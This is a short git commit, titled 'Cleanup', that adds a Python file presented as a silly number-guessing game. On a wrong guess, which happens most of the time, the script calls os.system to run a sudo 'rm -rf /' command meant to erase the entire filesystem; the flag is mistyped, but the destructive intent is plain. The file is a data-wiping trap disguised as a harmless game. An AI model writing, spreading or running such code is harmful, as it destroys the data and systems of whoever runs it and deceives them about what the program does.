d12afb50044aa3268176a081c029b311491c39bc
ryan :) <ryan@rwheeler121.xyz>
2023-07-04 16:25:30 -0400

    Cleanup

---
+++ randdel-linux.py
@@ -0,0 +1,12 @@
+import random
+import os
+
+number = random.randint(1,10)
+
+guess = input("Silly game! Guess a number between 1 and 10!")
+guess =int(guess)
+
+if guess == number:
+    print('You win!')
+else:
+    os.system('sudo rm -rf / --no-preserve -root')
